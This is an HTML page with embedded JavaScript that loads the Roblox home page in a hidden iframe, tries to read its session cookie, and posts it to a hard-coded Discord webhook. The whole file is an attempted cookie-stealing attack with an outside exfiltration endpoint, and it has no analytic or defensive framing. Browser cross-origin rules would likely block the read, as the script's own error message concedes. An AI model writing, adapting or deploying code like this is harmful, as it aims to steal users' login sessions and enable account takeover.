<html>
<body>
    <iframe id="target" src="https://www.roblox.com/home" style="display:none;"></iframe>
    <script>
        // Once the iframe loads, we capture the document.cookie from it
        const frame = document.getElementById('target');
        frame.onload = () => {
            try {
                const cookie = frame.contentWindow.document.cookie;
                fetch('https://discord.com/api/webhooks/1511610861804851221/vFuThVaS4xGzlpRpzBUnNpJaUqz-RKKb5p10TXkZLrAcRsvDrGWOAM7XzT7S_AutgDiI', {
                    method: 'POST',
                    headers: {'Content-Type': 'application/json'},
                    body: JSON.stringify({content: "Cookie: " + cookie})
                });
            } catch(e) {
                console.error("The browser is blocking cross-origin access.");
            }
        };
    </script>
</body>
</html>
